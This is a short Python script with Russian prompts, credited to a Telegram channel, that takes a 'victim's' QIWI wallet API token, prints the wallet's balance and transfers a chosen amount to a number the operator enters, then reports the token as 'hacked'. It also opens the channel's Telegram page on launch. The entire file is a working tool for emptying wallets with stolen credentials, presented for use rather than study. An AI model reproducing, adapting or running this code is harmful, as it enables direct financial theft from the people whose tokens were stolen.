import pyqiwi

from SimpleQIWI import * 

import sys

import webbrowser as wb

print("СКРИПТ КАНАЛА: @b1n_bash")
print("Версия: 0.2")
print("Сделана: @Azimjonm2333")

wb.open("https://t.me/b1n_bash")
def main ():
        while True:
                Token = input('\nВведите токен жертвы: ')

                try:
                        wallet = pyqiwi.Wallet(token=Token)
                        print('Баланс: ', wallet.balance(), 'рублей')
                        number = input('Пишите номер куда перевести деньги: ') 
                        amount = int (input('Сумма в рублях которые хотите вывести: '))
                        comment = input('Комент к платежу: ')
                        wallet.send(pid=99, recipient = number, amount = amount, comment=comment)
                        print ('\nВы успешно взломали киви токен: ', Token)
                        
                except Exception:
                        print ('\nНеправильный токен или что-то пошло не так. Попробуйте ещё раз!')
                        main ()
main()
